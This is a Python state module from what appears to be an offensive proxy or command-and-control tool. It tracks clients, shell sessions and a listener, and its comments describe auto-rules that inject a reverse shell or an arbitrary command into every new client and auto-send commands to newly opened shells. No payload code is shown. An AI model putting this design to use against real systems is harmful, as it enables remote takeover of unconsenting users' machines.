import threading

public_proxy   = False
server_running = False
proxy_port     = 9999

_clients_lock  = threading.Lock()
clients        = {}   # {id: {"ip": "...", "gateway": GatewayState}}

_sessions_lock = threading.Lock()
sessions       = {}   # {id: Session}
listener       = None # Listener | None

_notifications_lock = threading.Lock()
notifications  = []   # guarded by _notifications_lock; use append/pop under lock

# auto-rules ──────────────────────────────────────────────────────────────────
# rule_on_init: None | "revshell" | {"cmd": str}
#   revshell   → inject reverse shell to every new client
#   {cmd: ...} → inject arbitrary command to every new client
# rule_on_shell: None | str
#   str → auto-send command to every newly opened shell session
_rules_lock   = threading.Lock()
rule_on_init  = None
rule_on_shell = None
